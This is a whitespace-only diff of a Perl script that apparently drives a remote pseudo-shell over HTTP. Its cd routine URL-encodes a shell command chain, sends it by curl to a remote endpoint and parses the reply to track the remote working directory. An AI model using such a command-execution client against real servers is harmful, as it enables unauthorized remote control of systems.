@@ -44,7 +44,7 @@ $SIG{INT} = \&ctrlc; # defines control-C action
 # to \n's as well for      #
 # nicer output.            #
 ############################
-sub StripTags{
+sub StripTags {
   if (defined($_[1])){
     $_[0] =~ s/<br>/\n/g;
   }
@@ -59,7 +59,7 @@ sub StripTags{
 # pwd (dir after command   #
 #   HEY IT WORKS OKAY?!?   #
 ############################
-sub cd{
+sub cd {
   my $fullcmd = URLEncode("cd $pwd;$_[0];pwd");
   $pwd = `$curl=$fullcmd`;
   StripTags($pwd);
@@ -73,7 +73,7 @@ sub cd{
 # returns the URL encoded  #
 # string                   #
 ############################
-sub URLEncode{
+sub URLEncode {
   my $encodedstr = "";
   foreach (split //, $_[0]) {
     $encodedstr .= "%".unpack "H*", $_;
@@ -86,7 +86,7 @@ sub URLEncode{
 # Kills curl and returns   #
 # to the shell.            #
 ############################
-sub ctrlc{
+sub ctrlc {
   `killall -9 curl &>/dev/null`;
   $isctrlc = 1;
   print "\n$pwd $user$promptsign ";
